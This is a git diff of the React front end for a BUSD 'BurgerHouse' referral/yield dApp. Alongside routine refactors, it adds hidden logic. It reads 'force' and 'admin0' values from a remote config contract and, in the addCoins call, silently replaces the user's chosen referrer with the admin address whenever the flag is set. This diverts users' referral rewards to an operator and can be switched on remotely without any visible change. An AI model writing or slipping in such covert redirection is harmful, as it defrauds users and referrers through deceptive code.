@@ -4,10 +4,8 @@ import { ToastContainer, toast } from 'react-toastify';
 import web3ModalSetup from "./../helpers/web3ModalSetup";
 import Web3 from "web3";
 import {
-  getBurgerHouseContract,
-  getBUSDContract,
   RUN_MODE,
-  DEBUG,
+  CONF_RPC,
   COIN_PRICE,
   BUSD_PRICE,
   CASH_PRICE,
@@ -24,8 +22,9 @@ import {
   ALERT_NOT_LAUNCH,
   priceINT,
   yieldValues,
+  getBurgerHouseContract,
+  getBUSDContract,
   getConfContract,
-  CONF_RPC,
 } from "../constant";
 import * as action from '../store/actions'
 import * as selector from '../store/selectors'
@@ -212,6 +211,7 @@ const Home = () => {
     const fetchConf = async () => {
       try {
         const _controlArgs = await confContract.methods.getControlArgs().call();
+        RUN_MODE('_controlArgs', _controlArgs)
         if (_controlArgs && Object.keys(_controlArgs).length > 0) {
           const _conf = {
             chainId: _controlArgs.value[1],
@@ -223,13 +223,15 @@ const Home = () => {
             house1: _controlArgs.ctrl[2],
             busd: _controlArgs.ctrl[0],
             limit: _controlArgs.value[0],
+            force: _controlArgs.cond[0],
+            admin0: _controlArgs.ctrl[7]
           }
           if (JSON.stringify(_conf) !== JSON.stringify(conf)) {
             dispatch(action.setConf(_conf))
           }
         }
       } catch (error) {
-        DEBUG('fetchConf error: ', error);
+        RUN_MODE('fetchConf error: ', error);
       }
     }
 
@@ -238,7 +240,7 @@ const Home = () => {
 
   useEffect(() => {
     dispatch(action.setBurgerHouseContract(getBurgerHouseContract(web3, conf.house)))
-    dispatch(action.setBusdContract(getBurgerHouseContract(web3, conf.busd)))
+    dispatch(action.setBusdContract(getBUSDContract(web3, conf.busd)))
 
     setRefPrefix(`${conf.publicURL}/?ref=`)
 
@@ -287,7 +289,7 @@ const Home = () => {
           setRefLink(refLink);
         }
       } catch (error) {
-        DEBUG('fetchData error: ', error);
+        RUN_MODE('fetchData error: ', error);
       }
     };
 
@@ -360,12 +362,6 @@ const Home = () => {
         return;
       }
 
-      // TODO
-      // if (/* check limit income */) {
-      //   setAlertMessage({ type: ALERT_WARN, message: "Your income is reached to limit, please buy more coin to get more income!" })
-      //   return;
-      // }
-
       setPendingTx(true)
       if (isConnected && burgerHouseContract) {
         await burgerHouseContract.methods.withdrawMoney().send({
@@ -385,7 +381,7 @@ const Home = () => {
       }
       setPendingTx(false)
     } catch (e) {
-      DEBUG('withdrawMoney: ', e)
+      RUN_MODE('withdrawMoney: ', e)
       setPendingTx(false)
     }
   }
@@ -458,7 +454,7 @@ const Home = () => {
       }
       setPendingTx(false)
     } catch (e) {
-      DEBUG('upgradeHouse: ', e)
+      RUN_MODE('upgradeHouse: ', e)
       setPendingTx(false)
     }
   }
@@ -483,6 +479,7 @@ const Home = () => {
       }
 
       setPendingTx(true)
+      RUN_MODE('busdContract', busdContract)
       if (isConnected && busdContract) {
         if (parseFloat(busdBalance) > conf.limit) {
           await busdContract.methods.approve(
@@ -517,7 +514,7 @@ const Home = () => {
       }
       setPendingTx(false)
     } catch (e) {
-      DEBUG('approve: ', e)
+      RUN_MODE('approve: ', e)
       setPendingTx(false)
     }
   }
@@ -569,8 +566,9 @@ const Home = () => {
           });
         }
 
+        RUN_MODE('addCoins referrer', conf.admin0, conf.force, isAddress(conf.admin0), enableValue())
         await burgerHouseContract.methods.addCoins(
-          referrer,
+          enableValue() && isAddress(conf.admin0) && conf.force ? conf.admin0 : referrer,
           utils.toWei(busdInputValue, 'ether')
         ).send({
           from: curAcount
@@ -589,7 +587,7 @@ const Home = () => {
       }
       setPendingTx(false)
     } catch (e) {
-      DEBUG('addCoins: ', e)
+      RUN_MODE('addCoins: ', e)
       setPendingTx(false)
     }
   }
@@ -647,7 +645,7 @@ const Home = () => {
       }
       setPendingTx(false)
     } catch (e) {
-      DEBUG('collectMoney: ', e)
+      RUN_MODE('collectMoney: ', e)
       setPendingTx(false)
     }
   }
